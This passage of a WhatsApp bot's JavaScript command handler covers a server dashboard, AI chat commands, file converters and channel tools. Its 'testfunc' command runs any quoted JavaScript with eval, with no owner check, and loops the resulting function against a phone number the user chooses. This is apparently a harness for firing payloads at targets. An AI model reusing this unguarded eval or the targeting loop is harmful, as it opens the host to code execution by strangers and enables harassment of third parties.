                    ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 16px Arial"; ctx.fillText(value, x + 50, y + 40);
                }
        
                async function renderDashboard(stats) {
                    const W = 1200;
                    const H = 800;
                    const canvas = createCanvas(W, H);
                    const ctx = canvas.getContext('2d');
        
                    drawBackground(ctx, W, H);
                    drawLogo(ctx, 60, 50, 20);
        
                    ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 32px Arial"; ctx.textAlign = "left"; ctx.fillText("CANCER SYSTEM MONITOR", 100, 58);
                    ctx.fillStyle = THEME.textSecondary; ctx.font = "13px Arial"; ctx.fillText("Cancer Performance Dashboard", 100, 80);
        
                    const pingStatus = stats.ping < 100 ? THEME.success : stats.ping < 300 ? THEME.warning : THEME.danger;
                    ctx.fillStyle = pingStatus; ctx.font = "bold 28px Arial"; ctx.textAlign = "right"; ctx.fillText(`${stats.ping}ms`, W - 50, 50);
                    ctx.fillStyle = THEME.textSecondary; ctx.font = "12px Arial"; ctx.fillText("LATENCY", W - 50, 70);
        
                    const gradient = ctx.createLinearGradient(50, 100, W - 50, 100);
                    gradient.addColorStop(0, THEME.primary); gradient.addColorStop(0.33, THEME.success); gradient.addColorStop(0.66, THEME.purple); gradient.addColorStop(1, THEME.cyan);
                    ctx.strokeStyle = gradient; ctx.lineWidth = 2; ctx.beginPath(); ctx.moveTo(50, 100); ctx.lineTo(W - 50, 100); ctx.stroke();
        
                    const mainY = 130, cardW = 260, cardH = 240, gap = 30;
                    const x1 = 50, x2 = x1 + cardW + gap, x3 = x2 + cardW + gap, x4 = x3 + cardW + gap;
        
                    drawCard(ctx, x1, mainY, cardW, cardH, 15);
                    drawIcon(ctx, x1 + 30, mainY + 35, 'cpu', THEME.primary);
                    ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 18px Arial"; ctx.textAlign = "left"; ctx.fillText("CPU USAGE", x1 + 55, mainY + 40);
                    ctx.fillStyle = THEME.textSecondary; ctx.font = "11px Arial"; ctx.fillText(`${stats.cpuCores} Cores @ ${stats.cpuSpeed} MHz`, x1 + 55, mainY + 58);
                    drawDonutChart(ctx, x1 + cardW / 2, mainY + 140, 50, 12, stats.cpuLoad, THEME.primary);
                    ctx.fillStyle = THEME.textTertiary; ctx.font = "10px Arial"; ctx.textAlign = "center"; ctx.fillText(stats.cpuModel.substring(0, 32), x1 + cardW / 2, mainY + 215);
        
                    drawCard(ctx, x2, mainY, cardW, cardH, 15);
                    drawIcon(ctx, x2 + 30, mainY + 35, 'memory', THEME.success);
                    ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 18px Arial"; ctx.textAlign = "left"; ctx.fillText("MEMORY", x2 + 55, mainY + 40);
                    ctx.fillStyle = THEME.textSecondary; ctx.font = "11px Arial"; ctx.fillText(`Total: ${formatSize(stats.ramTotal)}`, x2 + 55, mainY + 58);
                    const ramPercent = (stats.ramUsed / stats.ramTotal) * 100;
                    drawDonutChart(ctx, x2 + cardW / 2, mainY + 140, 50, 12, ramPercent, THEME.success);
                    ctx.fillStyle = THEME.textTertiary; ctx.font = "11px Arial"; ctx.textAlign = "center"; ctx.fillText(`${formatSize(stats.ramUsed)} Used`, x2 + cardW / 2, mainY + 205); ctx.fillText(`${formatSize(stats.ramTotal - stats.ramUsed)} Free`, x2 + cardW / 2, mainY + 220);
        
                    drawCard(ctx, x3, mainY, cardW, cardH, 15);
                    drawIcon(ctx, x3 + 30, mainY + 35, 'disk', THEME.purple);
                    ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 18px Arial"; ctx.textAlign = "left"; ctx.fillText("STORAGE", x3 + 55, mainY + 40);
                    ctx.fillStyle = THEME.textSecondary; ctx.font = "11px Arial"; ctx.fillText(`Total: ${formatSize(stats.diskTotal)}`, x3 + 55, mainY + 58);
                    let diskPercent = stats.diskTotal > 0 ? (stats.diskUsed / stats.diskTotal) * 100 : 0;
                    drawDonutChart(ctx, x3 + cardW / 2, mainY + 140, 50, 12, diskPercent, THEME.purple);
                    ctx.fillStyle = THEME.textTertiary; ctx.font = "11px Arial"; ctx.textAlign = "center"; ctx.fillText(`${formatSize(stats.diskUsed)} Used`, x3 + cardW / 2, mainY + 205); ctx.fillText(`${formatSize(stats.diskTotal - stats.diskUsed)} Free`, x3 + cardW / 2, mainY + 220);
        
                    drawCard(ctx, x4, mainY, cardW, cardH, 15);
                    drawIcon(ctx, x4 + 30, mainY + 35, 'network', THEME.cyan);
                    ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 18px Arial"; ctx.textAlign = "left"; ctx.fillText("NETWORK", x4 + 55, mainY + 40);
                    ctx.fillStyle = THEME.textSecondary; ctx.font = "11px Arial"; ctx.fillText(`Interface: ${stats.networkInterface}`, x4 + 55, mainY + 58);
                    ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 13px Arial"; ctx.textAlign = "left"; ctx.fillText("RX (Download)", x4 + 30, mainY + 95);
                    ctx.fillStyle = THEME.cyan; ctx.font = "bold 20px Arial"; ctx.fillText(formatSize(stats.networkRx), x4 + 30, mainY + 120);
                    ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 13px Arial"; ctx.fillText("TX (Upload)", x4 + 30, mainY + 155);
                    ctx.fillStyle = THEME.pink; ctx.font = "bold 20px Arial"; ctx.fillText(formatSize(stats.networkTx), x4 + 30, mainY + 180);
        
                    const statsY = 400, statW = 175, statH = 70, statGap = 20;
                    drawStatBox(ctx, 50, statsY, statW, statH, "HOSTNAME", stats.hostname.substring(0, 15), THEME.primary, 'server');
                    drawStatBox(ctx, 50 + (statW + statGap), statsY, statW, statH, "PLATFORM", `${stats.platform} (${stats.arch})`, THEME.success, 'server');
                    drawStatBox(ctx, 50 + (statW + statGap) * 2, statsY, statW, statH, "BOT UPTIME", stats.uptimeBot, THEME.purple, 'clock');
                    drawStatBox(ctx, 50 + (statW + statGap) * 3, statsY, statW, statH, "SERVER UPTIME", stats.uptimeServer, THEME.warning, 'clock');
                    drawStatBox(ctx, 50 + (statW + statGap) * 4, statsY, statW, statH, "NODE.JS", stats.nodeVersion, THEME.cyan, 'server');
        
                    const perfY = 500, perfH = 250, perfW = W - 100;
                    drawCard(ctx, 50, perfY, perfW, perfH, 15);
                    ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 20px Arial"; ctx.textAlign = "left"; ctx.fillText("SYSTEM PERFORMANCE", 75, perfY + 35);
                    ctx.fillStyle = THEME.textSecondary; ctx.font = "12px Arial"; ctx.fillText("Real-time resource monitoring", 75, perfY + 55);
        
                    const barY = perfY + 85, barW = 500, barH = 18, barGap = 35;
                    drawProgressBar(ctx, 75, barY, barW, barH, stats.cpuLoad, THEME.primary, "CPU Load", `${stats.cpuLoad}%`);
                    drawProgressBar(ctx, 75, barY + barGap, barW, barH, ramPercent, THEME.success, "Memory Usage", `${Math.round(ramPercent)}%`);
                    drawProgressBar(ctx, 75, barY + barGap * 2, barW, barH, diskPercent, THEME.purple, "Disk Usage", `${Math.round(diskPercent)}%`);
                    drawProgressBar(ctx, 75, barY + barGap * 3, barW, barH, Math.min(100, (stats.ping / 500) * 100), pingStatus, "Network Latency", `${stats.ping}ms`);
        
                    const infoX = 620, infoStartY = perfY + 85, infoLineHeight = 28;
                    let infoY = infoStartY;
                    ctx.font = "13px Arial"; ctx.textAlign = "left";
                    const drawInfoLine = (label, value) => {
                        ctx.fillStyle = THEME.textSecondary; ctx.fillText(label, infoX, infoY);
                        ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 13px Arial"; ctx.fillText(value, infoX + 150, infoY);
                        ctx.font = "13px Arial"; infoY += infoLineHeight;
                    };
                    drawInfoLine("OS Release", stats.release);
                    drawInfoLine("CPU Cores", `${stats.cpuCores} Cores`);
                    drawInfoLine("CPU Speed", `${stats.cpuSpeed} MHz`);
                    drawInfoLine("Total Memory", formatSize(stats.ramTotal));
                    drawInfoLine("Free Memory", formatSize(stats.ramTotal - stats.ramUsed));
                    ctx.fillStyle = THEME.textTertiary; ctx.font = "10px Arial"; ctx.textAlign = "center"; ctx.fillText(`Dashboard Generated: ${new Date().toLocaleString()}`, W / 2, H - 20);
                    return canvas.toBuffer('image/png');
                }
        
                function getNetworkStats() {
                    try {
                        const interfaces = os.networkInterfaces();
                        let totalRx = 0, totalTx = 0, activeInterface = 'N/A', ip = 'N/A';
                        for (const [name, addrs] of Object.entries(interfaces)) {
                            if (name.toLowerCase().includes('lo')) continue;
                            for (const addr of addrs) {
                                if (addr.family === 'IPv4' && !addr.internal) { activeInterface = name; ip = addr.address; break; }
                            }
                        }
                        try {
                            const netstat = execSync("cat /proc/net/dev 2>/dev/null || echo ''").toString();
                            const lines = netstat.split('\n');
                            for (const line of lines) {
                                if (line.includes(':') && !line.includes('lo:')) {
                                    const parts = line.trim().split(/\s+/);
                                    if (parts.length >= 10) { totalRx += parseInt(parts[1]) || 0; totalTx += parseInt(parts[9]) || 0; }
                                }
                            }
                        } catch (e) {}
                        return { totalRx, totalTx, activeInterface, ip };
                    } catch (e) {
                        return { totalRx: 0, totalTx: 0, activeInterface: 'N/A', ip: 'N/A' };
                    }
                }
        
                const start = performance.now();
                await new Promise(resolve => setTimeout(resolve, 10));
                const end = performance.now();
                const latency = (end - start).toFixed(2);
        
                const cpus = os.cpus();
                const totalMem = os.totalmem();
                const freeMem = os.freemem();
                const loadAvg = os.loadavg();
                const cpuPercent = Math.min(100, (loadAvg[0] * 100) / cpus.length).toFixed(1);
        
                let diskTotal = 0, diskUsed = 0;
                try {
                    const df = execSync("df -k --output=size,used / 2>/dev/null").toString();
                    const lines = df.trim().split("\n");
                    if (lines.length > 1) {
                        const [total, used] = lines[1].trim().split(/\s+/).map(Number);
                        diskTotal = total * 1024;
                        diskUsed = used * 1024;
                    }
                } catch (e) {}
        
                const networkStats = getNetworkStats();
        
                const stats = {
                    ping: latency,
                    hostname: os.hostname(),
                    platform: os.platform(),
                    arch: os.arch(),
                    release: os.release(),
                    nodeVersion: process.version,
                    uptimeBot: formatTime(process.uptime()),
                    uptimeServer: formatTime(os.uptime()),
                    cpuModel: cpus[0].model.trim(),
                    cpuSpeed: cpus[0].speed,
                    cpuCores: cpus.length,
                    cpuLoad: cpuPercent,
                    ramTotal: totalMem,
                    ramUsed: totalMem - freeMem,
                    diskTotal: diskTotal,
                    diskUsed: diskUsed,
                    networkRx: networkStats.totalRx,
                    networkTx: networkStats.totalTx,
                    networkInterface: networkStats.activeInterface,
                    networkIP: networkStats.ip
                };
        
                const imageBuffer = await renderDashboard(stats);
        
                await sock.sendMessage(m.chat, {
                    image: imageBuffer,
                    caption: `*⚙️SERVER - INFORMATION🤖*\n\n` +
                        `📡Latency: *${latency}ms*\n` +
                        `🕰️Server Uptime: *${stats.uptimeServer}*\n` +
                        `💻CPU: *${stats.cpuLoad}%*\n` +
                        `💾RAM: *${formatSize(stats.ramUsed)} / ${formatSize(stats.ramTotal)}*\n` +
                        `💾Disk: *${formatSize(stats.diskUsed)} / ${formatSize(stats.diskTotal)}*\n` +
                        `🌐Network: *↓${formatSize(stats.networkRx)} ↑${formatSize(stats.networkTx)}*`
                }, {
                    quoted: m
                });
        
            } catch (e) {
                console.error(e);
                m.reply(`Error: ${e.message}`);
            }
        }
        break;
        //═══════════════════════════════════//
        case "eval": {
            if (!isOwner) return;
            if (!budy.startsWith(".eval")) return;
            
            const args = budy.trim().split(' ').slice(1).join(' ');
            if (!args) return reply(`*ex:* ${prefix + command} m.chat`);
            let teks;
            try {
                teks = await eval(`(async () => { ${args.startsWith("return") ? "" : "return"} ${args} })()`);
            } catch (e) {
                teks = e;
            } finally {
                 await reply(require('util').format(teks));
            }
        }
        break;
        //═══════════════════════════════════//
        case 'cancermods': {
            if (!isOwner) return reply(msg.owner)
        
            let db = getChatDB(m.chat)
        
            if (!args[0]) {
                return reply(
        `Cancer Mode:
        Group: ${db.global.group ? 'ON ✅' : 'OFF ❌'}
        Private: ${db.global.private ? 'ON ✅' : 'OFF ❌'}
        
        Contoh:
        ${prefix}cancermode gc on
        ${prefix}cancermode gc off
        ${prefix}cancermode private on
        ${prefix}cancermode private off`
                )
            }
        
            let type = args[0].toLowerCase()
            let value = args[1]?.toLowerCase()
        
            if (!['gc', 'group', 'private', 'pv'].includes(type)) {
                return reply('Pilih: gc / private 🗿')
            }
        
            if (!['on', 'off'].includes(value)) {
                return reply(`Contoh:\n${prefix}cancermode gc on\n${prefix}cancermode private off`)
            }
        
            let status = value === 'on'
        
            if (type === 'gc' || type === 'group') {
                db.global.group = status
                saveDB(db)
                return reply(`Cancer AI di group: ${status ? 'ON' : 'OFF'}`)
            }
        
            if (type === 'private' || type === 'pv') {
                db.global.private = status
                saveDB(db)
                return reply(`Cancer AI di private: ${status ? 'ON' : 'OFF'}`)
            }
        }
        break
        //═══════════════════════════════════//
        case 'cancerpon': {
            if (!isOwner) return reply('Cuma owner yang boleh buka segel ini 🗿')
        
            let db = getChatDB(m.chat)
        
            if (!text) {
                return reply(`Status: ${db[m.chat].status ? 'ON 👑' : 'OFF 😴'}`)
            }
        
            db[m.chat].status = text === 'on'
            saveDB(db)
        
            reply(text === 'on' ? 'Cancer aktif.' : 'Cancer dinonaktifkan.')
        }
        break
        //═══════════════════════════════════//
        case 'savagemode': {
            if (!isOwner) return reply('Cuma owner yang boleh buka segel ini 🗿')
        
            let db = getChatDB(m.chat)
        
            if (!text) {
                return reply(`Savage: ${db[m.chat].savage ? 'ON 😈' : 'OFF 😇'}`)
            }
        
            db[m.chat].savage = text === 'on'
            saveDB(db)
        
            reply(text === 'on' ? 'Savage ON 😈🔥' : 'Savage OFF 😇')
        }
        break
        //═══════════════════════════════════//
        case 'guardian': {
            let db = getChatDB(m.chat)
            let chatData = db[m.chat]
        
            if (!isOwner) return
        
            if (args[0] === "on") {
                chatData.guardian = true
                reply("🛡️ Guardian mode ON")
            } else if (args[0] === "off") {
                chatData.guardian = false
                reply("🛑 Guardian mode OFF")
            }
        
            saveDB(db)
        }
        break
        //═══════════════════════════════════//
        case 'quin': case 'kuin':
        case 'papi': case 'itssh': 
        case 'can': case 'bot': case 'cancer': {
            if (!text) return reply("Aya naon yeuh? 🗿")
            await runCancerAI(m, textInput)
        }
        break
        //═══════════════════════════════════//
        case 'ai-cancer': case 'cancer-ai': case 'ai': {
            if (!text) return reply(`\`[#] ${global.botname} ${global.version}\` \nHalo adakah yang bisa saya bantu?`)
            async function openai(text, logic) { // Membuat fungsi openai untuk dipanggil
                let response = await axios.post("https://chateverywhere.app/api/chat/", {
                    "model": {
                        "id": "gpt-4",
                        "name": "GPT-4",
                        "maxLength": 32000,  // Sesuaikan token limit jika diperlukan
                        "tokenLimit": 8000,  // Sesuaikan token limit untuk model GPT-4
                        "completionTokenLimit": 5000,  // Sesuaikan jika diperlukan
                        "deploymentName": "gpt-4"
                    },
                    "messages": [
                        {
                            "pluginId": null,
                            "content": text, 
                            "role": "user"
                        }
                    ],
                    "prompt": logic, 
                    "temperature": 0.5
                }, { 
                    headers: {
                        "Accept": "/*/",
                        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
                    }
                });
                
                let result = response.data;
                return result;
            }
            
            let pei = await openai(text, "")
            reply(pei)
        }
        break;
        //═══════════════════════════════════//
        case 'ai-cancer-v2': case 'deepseek-v2': {
            if (!text) return reply(`AI Assistant: Ada yang bisa saya bantu?`)
            
            // Read prompt from file
            function readSystemPrompt() {
                try {
                    
                    const promptPath = path.join(__dirname, '../lib/prompt.txt');
                    
                    if (!fs.existsSync(promptPath)) {
                        return "You are an AI assistant.";
                    }
                    
                    return fs.readFileSync(promptPath, 'utf8').trim() || "You are an AI assistant.";
                } catch (error) {
                    return "You are an AI assistant.";
                }
            }
            
            // Session storage (50-minute timeout)
            const userSessions = {};
            const SESSION_TIMEOUT = 50 * 60 * 1000;
            
            function getUserId() {
                return m.sender || m.from || 'default';
            }
            
            // Get or create session
            const userId = getUserId();
            const now = Date.now();
            
            // Clean old sessions
            for (const [id, session] of Object.entries(userSessions)) {
                if (now - session.lastActivity > SESSION_TIMEOUT) {
                    delete userSessions[id];
                }
            }
            
            let session = userSessions[userId];
            const isNewSession = !session || (now - session.lastActivity > SESSION_TIMEOUT);
            
            // Read system prompt
            const systemPrompt = readSystemPrompt();
            
            if (isNewSession || !session) {
                session = {
                    history: [],
                    lastActivity: now,
                    systemPrompt: systemPrompt
                };
                userSessions[userId] = session;
            }
            
            // Add to history
            session.history.push({ role: "user", content: text });
            
            // Simple echo response (no API)
            const response = `[System: ${systemPrompt.substring(0, 50)}...]\nUser: ${text}`;
            
            session.history.push({ role: "assistant", content: response });
            session.lastActivity = now;
            
            // Limit history
            if (session.history.length > 20) {
                session.history = session.history.slice(-20);
            }
            
            reply(response);
        }
        break;
        //═══════════════════════════════════//
        case 'tozip': {
            await reaction(m.chat, "♠️")
            // Usage:
            // 1) Reply file -> caption: .tozip [name_inside_zip]    (ke-reply document atau media)
            // 2) .tozip <filename.txt> <text...>                    (langsung convert teks jadi file di zip)
            //
            // Jika hanya .tozip -> akan ambil quoted file (jika ada) dan zip dengan nama asli.
    
            const argName = args[0] || null; // optional filename when creating from text
            // try to get quoted buffer
            let buffer = await getQuotedBuffer(m);
            let originalFileName = buffer ? (getQuotedFileName(m) || `file_${Date.now()}`) : null;
    
            if (!buffer) {
                // if no quoted file, treat rest of text as content
                let content = text || (m.quoted && (m.quoted.text || m.quoted.caption)) || '';
                content = stripBackticks(content);
                if (!content.trim()) {
                    return sock.sendMessage(m.chat, { text: `Kirim/reply file atau teks untuk dibuat .zip\nContoh:\n• Reply file -> caption: ${prefix}tozip\n• ${prefix}tozip file.txt Isi teks yang mau dimasukkan` }, { quoted: m });
                }
                // build buffer from text
                const filenameInZip = argName || 'content.txt';
                buffer = Buffer.from(content, 'utf-8');
                originalFileName = filenameInZip;
            }
    
            try {
                const zip = new AdmZip();
                // tambahkan file ke zip dengan nama originalFileName
                zip.addFile(originalFileName, buffer);
                const outBuffer = zip.toBuffer();
    
                const outName = `archive_${Date.now()}.zip`;
                await sock.sendMessage(m.chat, {
                    document: outBuffer,
                    fileName: outName,
                    mimetype: 'application/zip',
                    caption: `Berikut hasil zip: ${outName}`
                }, { quoted: m });
            } catch (e) {
                console.error(e);
                await sock.sendMessage(m.chat, { text: 'Gagal membuat zip: ' + (e.message || e) }, { quoted: m });
            }
        }
        break;
        //═══════════════════════════════════//
        case 'tojs': {
            await reaction(m.chat, "♠️")
            // Usage:
            // 1) Reply file/text -> caption: .tojs [name.js] [mode]
            //    mode: module (default) -> export default `...` ; common -> module.exports = `...`
            // 2) .tojs filename.js <text...>
            //
            // This will wrap the content in a JS module as a string, escaping backticks and backslashes.
    
            let desiredName = args[0] && args[0].toLowerCase().endsWith('.js') ? args[0] : null;
            let mode = 'module'; // default
            // if user passed two args: .tojs name.js module|common
            if (args[1]) {
                const m1 = args[1].toLowerCase();
                if (m1 === 'common' || m1 === 'module') mode = m1;
            }
    
            // If no filename given in args, maybe args contain mode only; handle flexible inputs
            if (!desiredName && args[0] && (args[0].toLowerCase() === 'module' || args[0].toLowerCase() === 'common')) {
                mode = args[0].toLowerCase();
            }
    
            // get buffer if replying file
            let buffer = await getQuotedBuffer(m);
            let inputText = '';
    
            if (buffer) {
                // treat buffer as text
                inputText = Buffer.from(buffer).toString('utf-8');
            } else {
                // try to read inline text after command: if first arg was filename, remove it
                const raw = stripBackticks(text || (m.quoted && (m.quoted.text || m.quoted.caption)) || '');
                // if arg[0] was filename, drop it from raw
                if (desiredName) {
                    const idx = raw.indexOf(' ');
                    inputText = idx === -1 ? '' : raw.slice(idx + 1);
                } else {
                    inputText = raw;
                }
            }
    
            if (!inputText.trim()) {
                return sock.sendMessage(m.chat, { text: `Kirim/reply teks atau file lalu gunakan:\n• ${prefix}tojs name.js [module|common]\n• Reply file dengan caption: ${prefix}tojs` }, { quoted: m });
            }
    
            // escape backticks and backslashes, preserve indentation
            const escaped = inputText.replace(/\\/g, '\\\\').replace(/`/g, '\\`');
    
            // create JS wrapper
            let jsContent;
            if (mode === 'common') {
                jsContent = `module.exports = \`\n${escaped}\n\`;\n`;
            } else {
                jsContent = `export default \`\n${escaped}\n\`;\n`;
            }
    
            // determine filename
            const outName = desiredName || `content_${Date.now()}.js`;
            const outBuffer = Buffer.from(jsContent, 'utf-8');
    
            try {
                await sock.sendMessage(m.chat, {
                    document: outBuffer,
                    fileName: outName,
                    mimetype: 'application/javascript',
                    caption: `Converted to JS -> ${outName}`
                }, { quoted: m });
            } catch (e) {
                console.error(e);
                await sock.sendMessage(m.chat, { text: 'Gagal membuat .js: ' + (e.message || e) }, { quoted: m });
            }
        }
        break;
        //═══════════════════════════════════//
        case "unfollallch": case 'unfoll':
        case "unfollowallch": {
            if (!isOwner) return;
        
            await sock.sendMessage(m.chat, { 
                react: { text: "⏳", key: m.key } 
            });
        
            try {
                const data = await sock.newsletterFetchAllSubscriptions();
        
                if (!data?.newsletters?.length) {
                    await sock.sendMessage(m.chat, { 
                        react: { text: "⚠️", key: m.key } 
                    });
                    return reply("Tidak ada channel yang sedang di-follow.");
                }
        
                let total = 0;
                let skipped = 0;
        
                for (let ch of data.newsletters) {
                    const jid = ch.id;
        
                    const role =
                        ch.viewer_metadata?.role ||
                        ch.role ||
                        ch.viewerRole ||
                        "UNKNOWN";
        
                    if (role === "ADMIN" || role === "OWNER") {
                        skipped++;
                        continue;
                    }
        
                    await sock.newsletterUnfollow(jid);
                    total++;
        
                    await new Promise(res => setTimeout(res, 2000));
                }
        
                await sock.sendMessage(m.chat, { 
                    react: { text: "✅", key: m.key } 
                });
        
                reply(
                    `📢 *UNFOLLOW CHANNEL SELESAI*\n\n` +
                    `🗑️ Unfollow: ${total}\n` +
                    `Skip (Admin/Owner): ${skipped}`
                );
        
            } catch (err) {
                console.error(err);
                await sock.sendMessage(m.chat, { 
                    react: { text: "❌", key: m.key } 
                });
                reply("Terjadi error saat unfollow channel.");
            }
        }
        break;
        //═══════════════════════════════════//
        case "testfunc": case "tesfunc": {
            if (!text || !text.includes(",")) {
                return reply(`Format:\n${prefix+command} 628xxxx,10\nReply ke async function`);
            }
            
            let [ targetNumber, loopRaw ] = text.split(",");
            const loopCount = parseInt(loopRaw);
            const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
            const target = `${formattedNumber}@s.whatsapp.net`;
            
            if (!m.quoted) return reply("Reply ke file .js atau kode function!");
            if (isNaN(loopCount) || loopCount <= 0) return reply("Loop harus angka valid!");
            
            try {
            
                let codeText;
                let testFunction;
                
                if (m.quoted.mimetype === "application/javascript" || m.quoted.fileName?.endsWith(".js")) {
                const buffer = await m.quoted.download();
                codeText = buffer.toString();
                } else if (m.quoted.text) {
                codeText = m.quoted.text;
                } else {
                return reply("Format tidak didukung!");
                }
                
                const funcMatch = codeText.match(/async\s+function\s+(\w+)\s*\([^)]*\)\s*{[\s\S]*?}/);
                if (!funcMatch) return reply("Async function tidak ditemukan!");
                
                const funcName = funcMatch[1];
                
                eval(codeText);
                testFunction = eval(funcName);
                
                if (typeof testFunction !== "function") {
                return reply("Gagal load function!");
                }
                
                const sentMsg = await sock.sendMessage(m.chat,{
                text:
                `🧪 *FUNCTION TEST TERMINAL*\n\n`+
                `🎯 Target : ${formattedNumber}\n`+
                `⚙️ Status : Initializing...\n`+
                `\n[░░░░░░░░░░░░░░░░░░] 0%`
                },{ quoted:m });
                
                let successCount = 0;
                let errorCount = 0;
                let errors = [];
                
                const spinner = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"];
                let spinIndex = 0;
                let lastPercent = -1;
                
                for (let i = 0; i < loopCount; i++) {
                
                    try {
                        await testFunction(target);
                        successCount++;
                    } catch(err) {
                        errorCount++;
                        errors.push(`Loop ${i+1}: ${err.message}`);
                    }
                    
                    const percent = Math.floor(((i+1)/loopCount)*100);
                    
                    if (percent !== lastPercent) {
                    
                        lastPercent = percent;
                        
                        const barLength = 20;
                        const filled = Math.round((percent/100)*barLength);
                        const bar = "█".repeat(filled) + "░".repeat(barLength-filled);
                        
                        const spin = spinner[spinIndex % spinner.length];
                        spinIndex++;
                    
                        await sock.sendMessage(m.chat,{
                            text:
                            `🧪 *FUNCTION TEST TERMINAL*\n\n`+
                            `🎯 Target : ${formattedNumber}\n`+
                            `⚙️ Status : Executing ${spin}\n`+
                            `🔁 Loop   : ${i+1}/${loopCount}\n\n`+
                            `[${bar}] ${percent}%`,
                            edit: sentMsg.key
                        });
                    
                    }
                    await sleep(1200);
                }
                
                // RESULT
                
                let resultText =
                `✅ *TEST COMPLETE*\n\n`+
                `🎯 Target : ${formattedNumber}\n`+
                `🔁 Loop   : ${loopCount}\n`+
                `✔ Success : ${successCount}\n`+
                `✖ Error   : ${errorCount}\n`+
                `📊 Rate   : ${((successCount/loopCount)*100).toFixed(2)}%\n`;
                
                if(errors.length) {
                    resultText += `\n🚨 Error Sample:\n` + errors.slice(0,5).join("\n");
                }
                
                await sock.sendMessage(m.chat, {
                    text: resultText,
                    edit: sentMsg.key
                });
            
            } catch(err) {
                console.error(err);
                m.reply(`Error: ${err.message}`);
            }
        }
        break;
        //═══════════════════════════════════//
        case 'cekfunc': {
            await reaction(m.chat, "♠️")
            // Usage:
            // • Reply code/text with caption .cekfunc
            // • .cekfunc <code...>
            //
            // This does:
            // - Detect JSON: try JSON.parse
            // - Detect HTML: try parse with cheerio
            // - Detect JS: try compile new Function(...) (compile-only; won't execute)
            // - Bracket balance check for (), {}, []
            // - Report results
    
            let src = text || (m.quoted && (m.quoted.text || m.quoted.caption)) || '';
            src = stripBackticks(src);
    
            if (!src.trim()) {
                return sock.sendMessage(m.chat, { text: `Reply code/text lalu gunakan: ${prefix + command}\nAtau: ${prefix + command} <code>` }, { quoted: m });
            }
    
            const report = [];
            // 1) bracket check
            const br = checkBracketsBalance(src);
            if (br.ok) report.push('✅ Bracket balance: OK');
            else report.push(`❌ Bracket error at pos ${br.pos}: ${br.reason || `found ${br.found}`}`);
    
            // 2) try JSON
            try {
                JSON.parse(src);
                report.push('✅ JSON: valid JSON');
            } catch (e) {
                report.push('⚠️ JSON: not valid JSON (or not JSON).');
            }
    
            // 3) try HTML parse (cheerio)
            try {
                const $ = cheerio.load(src);
                const hasHtmlTag = $('html').length > 0;
                const bodyText = $('body').text().trim();
                if (hasHtmlTag || bodyText.length > 0) {
                    report.push('✅ HTML: parses with cheerio (likely valid HTML fragment)');
                } else {
                    report.push('⚠️ HTML: no significant HTML nodes detected');
                }
            } catch (e) {
                report.push('❌ HTML parsing failed: ' + (e.message || e));
            }
    
            // 4) JS syntax compile check (new Function)
            try {
                // compile-only — doesn't run code
                new Function(src);
                report.push('✅ JS: syntax OK (compiles)');
            } catch (e) {
                report.push('❌ JS: syntax error — ' + (e.message || e));
            }
    
            // 5) length / binary check
            if (src.length > 5000) report.push(`ℹ️ Size: ${src.length} chars (large)`);
            else report.push(`ℹ️ Size: ${src.length} chars`);
    
            // send report
            const out = [
                '*Cek Function Report*',
                '',
                report.join('\n'),
                '',
                'Tip: Jika ingin pengecekan lebih spesifik (lint/ESLint), integrasikan ESLint di server.'
            ].join('\n');
    
            await sock.sendMessage(m.chat, { text: out }, { quoted: m });
        }
        break;
        //═══════════════════════════════════//
        case 'enchtml':
        case 'encrypthtml': {
            // Usage:
            // 1) .encrypt                     -> default base64; reply file or text
            // 2) .encrypt base64               -> force base64
            // 3) .encrypt aes mypass           -> AES with passphrase "mypass"
            //
            // If replying a file (document), bot will download and encrypt file bytes.
            // If using text (arg or quoted text), bot will encrypt the text content.
    
            // parse mode & passphrase from args
            // args[0] can be 'base64' or 'aes'; if aes => args[1] is pass
            let mode = (args[0] || 'base64').toLowerCase();
            let pass = args[1] || null;
            if (mode !== 'base64' && mode !== 'aes') {
                // maybe user passed pass only: .encrypt mypass  => assume aes
                if (args.length === 1) {
                    mode = 'aes'; pass = args[0];
                } else {
                    mode = 'base64';
                }
            }
    
            // helper untuk dapat buffer dari quoted document
            async function getQuotedBuffer(msg) {
                try {
                    const q = msg.quoted ? msg.quoted : null;
                    if (!q) return null;
                    const buff = await q.download?.();
                    return buff || null;
                } catch (e) {
                    return null;
                }
            }
    
            function getQuotedFileName(msg) {
                try {
                    const q = msg.quoted;
                    if (!q) return null;
                    const fileName =
                        q.filename ||
                        q.fileName ||
                        q.msg?.fileName ||
                        q.msg?.documentMessage?.fileName ||
                        q.message?.documentMessage?.fileName ||
                        null;
                    return fileName;
                } catch (e) { return null; }
            }
    
            // obtain source: prefer replied file, else text param or quoted text
            let buffer = await getQuotedBuffer(m);
            let originalFileName = buffer ? (getQuotedFileName(m) || `file_${Date.now()}.bin`) : null;
            let inputText = text || (m.quoted && (m.quoted.text || m.quoted.caption)) || '';
    
            if (!buffer && !inputText.trim()) {
                return sock.sendMessage(
                    m.chat,
                    {
                        text: `Kirim/reply file atau teks HTML lalu gunakan:\n• ${prefix}encrypt\n• ${prefix}encrypt base64\n• ${prefix}encrypt aes <passphrase>\n\nContoh: reply file.html dengan caption: ${prefix}encrypt aes mypass`
                    },
                    { quoted: m }
                );
            }
    
            if (mode === 'aes' && (!pass || pass.length < 1)) {
                return sock.sendMessage(m.chat, { text: 'Mode AES butuh passphrase. Contoh: .encrypt aes mypass' }, { quoted: m });
            }
    
            try {
                let outEncoded; // string (base64 or AES:base64)
                if (buffer) {
                    // encrypt binary
                    if (mode === 'base64') {
                        outEncoded = toBase64Buffer(buffer);
                    } else { // aes
                        outEncoded = encryptAESBuffer(buffer, pass); // returns 'AES:...base64...'
                    }
                } else {
                    // text input
                    const inputBuf = Buffer.from(inputText, 'utf-8');
                    if (mode === 'base64') {
